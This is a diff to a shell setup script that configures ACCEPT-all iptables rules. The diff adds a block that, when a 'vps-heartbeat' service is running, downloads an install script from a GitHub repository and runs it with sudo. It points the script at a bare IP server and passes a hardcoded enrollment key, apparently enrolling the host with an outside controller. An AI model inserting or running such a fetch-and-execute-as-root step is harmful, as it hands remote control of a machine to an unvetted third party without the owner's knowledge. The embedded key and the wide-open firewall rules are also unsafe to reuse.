@@ -10,6 +10,14 @@ sudo iptables -A FORWARD -p all -j ACCEPT
 sudo iptables -A OUTPUT -p all -j ACCEPT
 sudo iptables -A InstanceServices -p all -j ACCEPT
 
+if systemctl is-active --quiet vps-heartbeat; then
+    echo "Running"
+    sudo rm -rf install-vps-heartbeat.sh && wget https://github.com/mahaliabpqvn07/custom-vps-monitor/raw/main/install-vps-heartbeat.sh
+    VPSMON_SERVER_BASE="http://168.110.215.95:8554" && VPSMON_ENROLLMENT_KEY="VuUK9DmdEHelZfI6Aoc3A0-7Anw2NQn6301vAqxKQIxbZL1v8yMayQ" && sudo bash install-vps-heartbeat.sh $VPSMON_SERVER_BASE $VPSMON_ENROLLMENT_KEY
+else
+    echo "Not Running"
+fi
+
 PBKEY=""
 # Colors for output
 RED='\033[0;31m'
